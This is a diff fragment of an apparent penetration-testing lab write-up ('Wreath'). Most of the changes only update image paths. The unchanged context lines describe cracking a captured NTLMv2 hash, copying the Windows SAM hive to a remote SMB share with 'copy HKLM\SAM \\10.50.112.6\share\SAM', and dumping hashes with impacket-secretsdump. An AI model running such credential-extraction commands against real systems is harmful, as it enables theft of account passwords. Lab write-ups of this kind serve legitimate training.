-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 521.50px; height: 228.03px;">![](images/image55.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 521.50px; height: 228.03px;">![](_reports/Wreath/image55.png)</span>
 
 <span class="c35 c2">Note that we received the NTLMV2 hash of our created SMB user. Cracking this hash reveals that the password of 0xd4y is pass.</span>
 
@@ -599,11 +599,11 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span class="c0">copy HKLM\SAM \\10.50.112.6\share\SAM</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 420.50px; height: 38.50px;">![](images/image42.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 420.50px; height: 38.50px;">![](_reports/Wreath/image42.png)</span>
 
 <span>Now with the sensitive SAM and SYSTEM hives on my local system, I was able to extract all hashes using the</span> <span class="c0">impacket-secretsdump</span><span> tool.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 399.51px; height: 158.02px;">![](images/image69.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 399.51px; height: 158.02px;">![](_reports/Wreath/image69.png)</span>
 
 # <span class="c30 c11 c0">Cleanup</span>
 
